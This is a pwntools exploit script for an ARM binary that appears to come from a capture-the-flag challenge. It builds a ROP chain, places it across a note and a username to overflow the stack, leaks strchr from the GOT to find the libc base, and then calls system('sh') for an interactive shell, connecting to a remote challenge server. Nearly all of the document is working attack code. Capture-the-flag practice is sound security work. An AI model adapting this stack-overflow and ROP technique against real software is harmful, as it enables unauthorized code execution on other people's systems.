#!/usr/bin/env python3

from pwn import *

the_binary = "./prob"
context.binary = the_binary
elf = context.binary

if args.REMOTE:
    libc = ELF("./remote.libc-2.27.so", checksec=False)
else:
    libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-h"]

class Config:
    gdb_listen_port = args.GDB_LISTEN_PORT or 12345

base_args = ["/usr/bin/qemu-arm-static", "-L", "/usr/arm-linux-gnueabihf/"]
gdb_cmds = [
    f"file {the_binary}",
    "break *0x11d27f6",
    "ignore 1 2",
    "continue",
]

if args.REMOTE:
    io = remote("armarm.sstf.site", 31338)
elif args.STRACE:
    io = process(base_args + ["-strace", the_binary], stderr=open("./trace.txt", "w"))
elif args.GDB:
    io = process(base_args + ["-g", str(Config.gdb_listen_port), the_binary])

    gdb_args = ["gdb-multiarch", "-ex", f"target remote :{Config.gdb_listen_port}"]
    for gdb_cmd in gdb_cmds:
        gdb_args.append("-ex")
        gdb_args.append(gdb_cmd)

    gdb_pid = run_in_new_terminal(gdb_args + [the_binary])
    log.info(f"Running GDB process in pid {gdb_pid}")
else:
    io = process(base_args + [the_binary])

def pad(original, new_len, pad_char):
    assert new_len >= len(original)
    return original + (new_len - len(original)) * pad_char

def menu(choice):
    io.sendlineafter(">>", str(choice))

def maybe_add_newline(text, check_chars=True, max_len=100):
    assert len(text) <= max_len
    if check_chars:
        assert not any(c in text for c in [b"\x00", b" ", b"\t", b"\n", b"\v", b"\f", b"\r"])

    if len(text) < max_len:
        text += b"\n"

    return text

def join(username, password):
    username = maybe_add_newline(username)
    password = maybe_add_newline(password)

    menu(1)
    io.sendafter("User: ", username)
    io.sendafter("Password: ", password)

def login(username, password):
    username = maybe_add_newline(username)
    password = maybe_add_newline(password)

    menu(2)
    io.sendafter("User: ", username)
    io.sendafter("Pass: ", password)

def print_notes():
    menu(3)

def save_note(data):
    data = maybe_add_newline(b"note://" + data, check_chars=False)

    menu(4)
    io.sendafter("data: ", data)

class Gadgets:
    main_addr = 0x11d24c5

    # pop {r3, r4, r5, r6, r7, r8, r9, pc}
    pop_r3_r4_r5_r6_r7_r8_r9_pc = 0x11d27f7

    # mov r0, r7; blx r3;
    mov_r0_r7_then_blx_r3 = 0x011d27ef

    # 011d2160  00f07aeb   blx     #puts
    # 011d2164  00bf       nop
    # 011d2166  80bd       pop     {r7, pc} {__saved_r7} {var_4}
    # blx_puts = 0x11d2160
    blx_puts = 0x11d2161

    if args.REMOTE:
        # 0x0006b864 (0x0006b865): pop {r0, r1, pc};
        pop_r0_r1_pc_off = 0x0006b865
    else:
        # 0x0006ed9a (0x0006ed9b): pop {r0, r1, pc};
        pop_r0_r1_pc_off = 0x0006ed9b

class Const:
    available_note_len = 100 - len(b"note://")

def do_rop(chain):
    # Split up the ROP chain between our note and our username.
    note = b""
    note += chain[:0x10]
    note = pad(note, Const.available_note_len, b"A")

    username = b""
    username += chain[0x10:]
    username = pad(username, 0x60, b"B")
    join(username, b"my_password")
    login(username, b"my_password")

    # Trigger stack-based overflow, with data comprised of both our note and our
    # current username.
    save_note(note)

# Calling convention reference:
# https://stackoverflow.com/a/261496

def call_func_rop(func_addr, argument, pack_arg=True, ret_addr=Gadgets.main_addr):
    """Build a ROP chain to call an arbitrary function with arbitrary argument."""
    rop = b""
    rop += p32(Gadgets.pop_r3_r4_r5_r6_r7_r8_r9_pc)
    rop += p32(func_addr) # r3 == address/function we will call
    rop += b"C"*4 # r4
    rop += b"D"*4 # r5
    rop += b"E"*4 # r6
    if pack_arg:
        rop += p32(argument) # r7 == argument
    else:
        assert len(argument) == 4
        rop += argument
    rop += b"F"*4 # r8
    rop += b"G"*4 # r9
    rop += p32(Gadgets.mov_r0_r7_then_blx_r3)
    rop += b"H"*4
    rop += p32(ret_addr)  # where we resume execution flow
    return rop

leak_rop = call_func_rop(Gadgets.blx_puts, elf.got.strchr)
do_rop(leak_rop)

io.recvuntil("\n")
raw_leak = io.recvuntil("\n")
libc_strchr = u32(raw_leak[:4])
libc.address = libc_strchr - libc.sym.strchr
sh_addr = next(libc.search(b"sh\x00"))

log.info("strchr@libc: %#x" % libc_strchr)
log.info("libc base: %#x" % libc.address)
log.info("system@libc: %#x" % libc.sym.system)
log.info("sh@libc: %#x" % sh_addr)

# Since we can use gadgets from within libc now, we can use a smaller ROP
# space to just call system("sh") (using the "sh" string from within libc).
pwn_rop = b""
pwn_rop += p32(libc.address + Gadgets.pop_r0_r1_pc_off)
pwn_rop += p32(sh_addr)
pwn_rop += p32(0xdeadbeef)
pwn_rop += p32(libc.sym.system)
note = pad(pwn_rop, Const.available_note_len, b"A")
save_note(note)

io.interactive()
